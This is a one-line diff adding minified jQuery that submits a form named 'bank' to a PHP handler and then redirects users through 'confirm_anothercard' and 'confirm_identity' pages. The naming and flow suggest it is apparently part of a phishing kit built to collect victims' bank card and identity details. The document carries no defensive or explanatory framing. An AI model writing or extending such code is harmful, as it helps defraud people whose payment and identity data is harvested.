@@ -1,0 +1,1 @@
+$("#bank").validate({submitHandler:function(){$.post("../action/post_bank.php",$("#bank").serialize(),function(a){"doublecard"==a?setTimeout(function(){window.location.assign("confirm_anothercard")}):"identity"==a?setTimeout(function(){window.location.assign("confirm_identity")}):setTimeout(function(){window.location.assign("success")},3e3)})}});
